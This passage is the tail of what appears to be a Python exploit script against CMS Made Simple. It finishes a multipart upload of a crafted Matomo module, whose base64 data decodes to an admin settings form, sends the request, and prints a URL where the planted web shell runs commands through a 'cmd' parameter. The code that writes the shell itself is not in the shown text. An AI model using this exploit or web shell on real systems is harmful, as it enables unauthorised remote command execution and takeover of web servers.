<data><![CDATA[e2Zvcm1fc3RhcnQgYWN0aW9uPSJzYXZlc2V0dGluZ3MifQ0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQxIj57JG1vZC0+bGFuZygiYmFzZXVybCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkMSIgdHlwZT0idGV4dCIgc2l6ZT0iNjQiIGxlbmd0aD0iNjQiIHZhbHVlPSJ7JG1vZC0+cHJmKCJiYXNldXJsIil9IiBuYW1lPSJ7JGFpZH1iYXNldXJsIj57JG1vZC0+bGFuZygiYmFzZXVybGhlbHAiKX0NCiAgICA8L3A+DQo8L2Rpdj4NCg0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQzIj57JG1vZC0+bGFuZygiYXBpdG9rZW4iKX06PC9sYWJlbD4geypjbXNfaGVscCBrZXk9J2hlbHBfYXJ0aWNsZV91c2VleHBpcnknIHRpdGxlPSR1c2VleHBpcmF0aW9udGV4dCp9DQogICAgPC9wPg0KICAgIDxwIGNsYXNzPSJwYWdlaW5wdXQiPg0KICAgICAgICA8aW5wdXQgaWQ9InskYWlkfWZsZDMiIHR5cGU9InRleHQiIHNpemU9IjY0IiBsZW5ndGg9IjY0IiB2YWx1ZT0ieyRtb2QtPnByZigiYXBpdG9rZW4iKX0iIG5hbWU9InskYWlkfWFwaXRva2VuIj57JG1vZC0+bGFuZygiYXBpdG9rZW5oZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkNCI+eyRtb2QtPmxhbmcoInNpdGVpZCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkNCIgdHlwZT0idGV4dCIgc2l6ZT0iOCIgbGVuZ3RoPSI4IiB2YWx1ZT0ieyRtb2QtPnByZigic2l0ZWlkIil9IiBuYW1lPSJ7JGFpZH1zaXRlaWQiPnskbW9kLT5sYW5nKCJzaXRlaWRoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkMiI+eyRtb2QtPmxhbmcoInRyYWNraW5nY29kZSIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDx0ZXh0YXJlYSBpZD0ieyRhaWR9ZmxkMiIgcm93cz0iMTIiIGNvbHM9IjQwIiBuYW1lPSJ7JGFpZH10cmFja2luZ2NvZGUiPnskbW9kLT5wcmYoInRyYWNraW5nY29kZSIpfTwvdGV4dGFyZWE+DQogICAgICAgIDxici8+DQogICAgICAgIHskbW9kLT5sYW5nKCJ0cmFja2luZ2NvZGVoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCg0KICAgIDwvcD4NCiAgICA8cCBjbGFzcz0icGFnZWlucHV0Ij4NCiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ieyRhaWR9c3VibWl0IiB2YWx1ZT0ieyRtb2QtPmxhbmcoInNhdmVzZXR0aW5ncyIpfSIvPg0KICAgIDwvcD4NCjwvZGl2Pg0KDQoNCntmb3JtX2VuZH0NCg==]]></data>\n    </file>\n</module>\r\n-----------------------------207726338310671742711263591267--\r\n"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

print "Try to access your web shell at: " + target_url + "/modules/Matomo/action.admin_settings.php?cmd=ls%20-al"
            
